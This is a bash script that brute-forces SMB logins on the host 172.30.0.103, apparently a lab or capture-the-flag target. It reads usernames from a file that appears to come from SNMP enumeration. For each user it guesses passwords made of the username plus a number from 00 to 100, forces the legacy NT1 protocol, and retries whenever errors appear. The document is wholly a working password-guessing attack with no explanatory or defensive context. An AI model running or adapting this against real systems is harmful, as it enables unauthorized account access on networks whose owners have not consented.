#!/bin/bash
for user in $( cat usersSNMP2 )
do
for number in $( seq 0 100 )
do
if [ "$number" -lt "10" ]
then
echo 'username='$user > smbclient.conf
echo 'password='$user'0'$number >> smbclient.conf
cat smbclient.conf
sleep 1s
length="1"
while [ "$length" -gt "0" ]
do
smbclient -A smbclient.conf -L \\172.30.0.103 -t 8 --option='client min protocol=NT1' 2> debugFile
sleep 2s
length=$(wc -c debugFile | cut -d " " -f 1)
echo "$length"
done
sleep 1.5s
elif [ "$number" -gt "9" ]
then
echo 'username='$user > smbclient.conf
echo 'password='$user$number >> smbclient.conf
cat smbclient.conf
sleep 1s
length="1"
while [ "$length" -gt "0" ]
do
smbclient -A smbclient.conf -L \\172.30.0.103 -t 8 --option='client min protocol=NT1' 2> debugFile
sleep 2s
length=$(wc -c debugFile | cut -d " " -f 1)
echo "$length"
done
sleep 1.5s
else
echo "Deu alguma merda na var $number"
fi
done
done
